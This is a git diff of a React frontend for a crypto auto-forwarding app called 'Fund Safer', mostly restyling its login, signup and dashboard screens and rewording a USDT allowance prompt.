@@ -30,7 +30,6 @@ function App() {
       const data = await contract.getUserDashboardData(userAddress);
       setIsRegistered(data.isReg);
       setDestination(data.dest);
-      // Automatically fetch history for both new and migrated users
       if (data.isReg) fetchHistory(userAddress, provider);
       const fee = await contract.signupFee();
       setSignupFee(ethers.formatUnits(fee, 18));
@@ -55,8 +54,8 @@ function App() {
   };
 
   const handleManualApprove = async () => {
-    // UPDATED PROMPT: Added bot instructions
-    const amount = prompt("Kitna allowance dena chahte ho (USDT):\n\nBot off krne ke liye 1 bhrke confirm kre", "10");
+    // UPDATED PROMPT TEXT
+    const amount = prompt("Kitna allowance dena chahte ho (USDT):\n\nBot off krne ke liye 1 bhrke confirm kre\nBot on krne ke liye 10,000 fill kr ke confirm kre", "10");
     if (!amount) return;
     setLoading(true);
     try {
@@ -91,46 +90,44 @@ function App() {
   const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);
 
   return (
-    <div className="min-h-screen text-white p-4 flex flex-col items-center" style={{background: 'linear-gradient(180deg, #1a0b2e 0%, #05020a 100%)'}}>
+    <div className="min-h-screen text-white p-4 flex flex-col items-center" style={{background: '#05020a'}}>
       
       <div className="text-center my-8">
-        <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-pink-500 rounded-3xl flex items-center justify-center text-4xl font-bold mb-4 mx-auto shadow-[0_0_20px_rgba(168,85,247,0.4)]">F</div>
+        <div className="w-24 h-24 bg-gradient-to-br from-purple-500 to-pink-500 rounded-[2rem] flex items-center justify-center text-5xl font-bold mb-6 mx-auto shadow-[0_0_30px_rgba(168,85,247,0.4)]">F</div>
         <h1 className="text-4xl font-bold tracking-tight">Fund Safer</h1>
-        <p className="text-purple-400 text-xs tracking-[0.2em] mt-1 uppercase">Auto-Forwarding Exchange</p>
+        <p className="text-purple-400 text-xs tracking-[0.2em] mt-2 uppercase">Auto-Forwarding Exchange</p>
       </div>
 
       {!account ? (
-        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] text-center border border-purple-500/30 backdrop-blur-md shadow-2xl">
-          <h2 className="text-2xl font-bold mb-6">Login</h2>
-          <p className="text-gray-400 mb-8 text-sm">Get started today by connecting your wallet</p>
-          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-full font-bold shadow-lg hover:opacity-90 transition-opacity">Connect Wallet ➔</button>
+        <div className="w-full max-w-sm bg-[#1a0f30] p-8 rounded-[2rem] text-center border border-purple-500/20 shadow-2xl">
+          <h2 className="text-3xl font-bold mb-8">Login</h2>
+          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-[2rem] font-bold shadow-lg hover:opacity-90">Connect Wallet ➔</button>
         </div>
       ) : !isRegistered ? (
-        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30">
+        <div className="w-full max-w-sm bg-[#1a0f30] p-8 rounded-[2rem] border border-purple-500/20">
           <h2 className="text-2xl font-bold mb-6 text-center">Sign Up</h2>
-          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-full mb-4 border border-purple-800 focus:border-pink-500 outline-none" />
-          <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-full font-bold hover:opacity-90 transition-opacity">Sign Up ({signupFee} USDT)</button>
+          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800" />
+          <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-[2rem] font-bold">Sign Up ({signupFee} USDT)</button>
         </div>
       ) : (
-        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30 shadow-2xl">
-          <h2 className="text-3xl font-bold mb-1">Dashboard</h2>
-          <p className="text-cyan-400 mb-8 text-xs font-mono">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
+        <div className="w-full max-w-sm bg-[#1a0f30] p-8 rounded-[2rem] border border-purple-500/20 shadow-2xl">
+          <p className="text-cyan-400 mb-6 text-sm">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
           
           <p className="text-gray-400 text-sm mb-2 ml-1">Destination Address</p>
-          <input type="text" placeholder={destination || "Enter 0x address"} onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-4 border border-purple-800 focus:border-pink-500 outline-none" />
+          <input type="text" placeholder={destination || "Enter 0x address"} onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800" />
           
-          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-2xl font-bold mb-3 shadow-lg hover:opacity-90 transition-opacity">Save Dest</button>
-          <button onClick={handleManualApprove} className="w-full bg-transparent border border-purple-500 py-4 rounded-2xl font-bold mb-8 hover:bg-purple-900/20 transition-all">✓ Approve</button>
+          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-[2rem] font-bold mb-3 shadow-lg">Save Dest</button>
+          <button onClick={handleManualApprove} className="w-full bg-transparent border border-purple-500 py-4 rounded-[2rem] font-bold mb-8">✓ Approve</button>
 
           <div className="flex justify-between items-center mb-4">
-            <h3 className="font-bold text-sm tracking-wider text-gray-300">RECENT TRANSFERS</h3>
+            <h3 className="font-bold text-sm text-gray-300">RECENT TRANSFERS</h3>
             <span className="text-pink-400 font-bold">Total: {totalTransferred.toFixed(2)} USDT</span>
           </div>
           
           <div className="space-y-3">
             {history.map((tx, i) => (
-              <div key={i} className="bg-[#0a0515] p-4 rounded-2xl flex justify-between border border-purple-900/50 hover:border-purple-500/50 transition-all">
-                <span className="text-xs text-gray-400 font-mono">Sent to {tx.destination.substring(0,6)}...</span>
+              <div key={i} className="bg-[#0a0515] p-4 rounded-[2rem] flex justify-between border border-purple-900/50">
+                <span className="text-xs text-gray-400">Sent to {tx.destination.substring(0,6)}...</span>
                 <span className="text-green-400 font-bold text-sm">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
               </div>
             ))}
